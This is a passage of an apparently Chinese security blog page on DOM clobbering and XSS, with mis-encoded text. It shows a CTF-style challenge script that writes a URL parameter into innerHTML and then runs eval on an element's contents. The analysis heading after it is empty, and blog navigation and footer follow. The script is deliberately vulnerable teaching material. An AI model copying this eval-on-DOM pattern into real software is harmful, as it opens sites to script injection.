class="line">&lt;script&gt;</span><br><span class="line">    /* Input */</span><br><span class="line">    var number = (new URL(location).searchParams.get(&#x27;number&#x27;) || &quot;7&quot;)[0],</span><br><span class="line">        name = DOMPurify.sanitize(new URL(location).searchParams.get(&#x27;name&#x27;), &#123; SAFE_FOR_JQUERY: true &#125;);</span><br><span class="line">    $(&#x27;number#number&#x27;).html(number);</span><br><span class="line">    document.getElementById(&#x27;welcome&#x27;).innerHTML = (`Welcome &lt;b&gt;$&#123;name || &quot;Mr. Wick&quot;&#125;!&lt;/b&gt;`);</span><br><span class="line"></span><br><span class="line">    /* Greet */</span><br><span class="line">    $(&#x27;#keanu&#x27;).popover(&#x27;show&#x27;)</span><br><span class="line">    setTimeout(_ =&gt; &#123;</span><br><span class="line">        $(&#x27;#keanu&#x27;).popover(&#x27;hide&#x27;)</span><br><span class="line">    &#125;, 2000)</span><br><span class="line"></span><br><span class="line">    /* Check Magic Number */</span><br><span class="line">    var magicNumber = Math.floor(Math.random() * 10);</span><br><span class="line">    var number = eval($(&#x27;number#number&#x27;).html());</span><br><span class="line">    if (magicNumber === number) &#123;</span><br><span class="line">        alert(&quot;You&#x27;re Breathtaking!&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>åˆ†æ</p>
</div><div class="post-copyright"><div class="post-copyright-author"><span class="post-copyright-meta">æœ¬æ–‡ä½œè€…: </span><span class="post-copyright-info"><a href="mailto:undefined">JGwebre</a></span></div><div class="post-copyright-type"><span class="post-copyright-meta">æœ¬æ–‡é“¾æ¥: </span><span class="post-copyright-info"><a href="https://heisha123.github.io/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/">https://heisha123.github.io/2025/07/14/XSS-DOMç ´å/</a></span></div><div class="post-copyright-notice"><span class="post-copyright-meta">ç‰ˆæƒå£°æ˜: </span><span class="post-copyright-info">æœ¬ç«™ç‚¹æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥è‡ª <a href="https://heisha123.github.io">JGçš„ä¸ªäººåšå®¢</a>ï¼</span></div></div><div class="post-copyright valine" id="comments-container"><script src="//unpkg.com/valine@1.4.14/dist/Valine.min.js"></script><script>let arr = location.href.split('/#more')[0].split('/');
let title = arr[arr.length - 1];
if (title === '') {
    title = arr[arr.length - 2];
}
var flag = false;
var gitFun = function () {
    try {
        var valineObj = window.GLOBAL_CONFIG.valine;
        new Valine({
            el: "#comments-container",
            ...valineObj
        });
        flag = true;
    } catch (e) {
        flag = false;
    }
}
var setIn = setInterval(() => {
    if (!flag) {
        gitFun();
    } else {
        clearInterval(setIn);
    }
}, 200);</script></div></article><div id="pagination"><div class="prev-post pull-left"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/2025/07/18/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-notes/"><i class="fas fa-angle-left">&nbsp;</i><span>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]notes</span></a></div><div class="next-post pull-right"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/2025/07/14/XSS-%E5%85%A8/"><span>XSS-å…¨</span><span>&nbsp;</span><i class="fas fa-angle-right"></i></a></div></div><!--div!= paginator()--></div></div><div class="button-hover" id="return-top"><i class="fas fa-arrow-up" aria-hidden="true"></i></div><footer><div id="footer"><div class="button-hover" id="side-button"><i class="fas fa-arrow-right"></i></div><div class="right-content"><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fas fa-file-o"></i></span><span id="busuanzi_value_page_pv"></span><span></span></div><div class="copyright">&copy;2025 By JGwebre</div></div></div></footer></div><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery-3.3.1.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/velocity.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery.mCustomScrollbar.concat.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/fan.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/canvas_bg.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/utils.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/scroll.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/sidebar.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/copy.js"></script><!--script(src=url)--><div class="search-dialog"><div id="algolia-search-title">Algolia</div><div class="search-close-button"><i class="fa fa-times"></i></div><!--div#current-refined-values--><!--div#clear-all--><div id="search-box"></div><!--div#refinement-list--><hr><div id="hits"></div><div id="algolia-pagination"></div></div><div class="search-mask"></div><script src="/js/search/algolia.js"></script></body></html>